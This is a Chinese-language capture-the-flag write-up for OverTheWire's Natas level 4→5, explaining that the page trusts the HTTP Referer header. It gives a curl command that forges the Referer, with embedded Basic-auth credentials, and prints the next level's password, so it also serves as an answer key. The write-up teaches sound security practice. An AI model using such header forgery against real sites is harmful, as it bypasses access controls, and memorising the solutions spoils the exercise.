# Natas Level 4 → 5

## 目標
伺服器檢查 HTTP Referer header，要求必須從 natas5 網站來訪。

## 解題過程

頁面顯示：
```
Access disallowed. You are visiting from "http://natas4..." while authorized users should come only from "http://natas5..."
```

用 curl 偽造 Referer header：
```bash
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
  -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
  --insecure
```

## 關鍵概念

- HTTP `Referer` header 可以被任意偽造
- 不能用 Referer 做安全驗證
- curl 可以完全自訂所有 HTTP header

## 密碼
`0n35PkggAPm2zbEpOU802c0x0Msn1ToK`
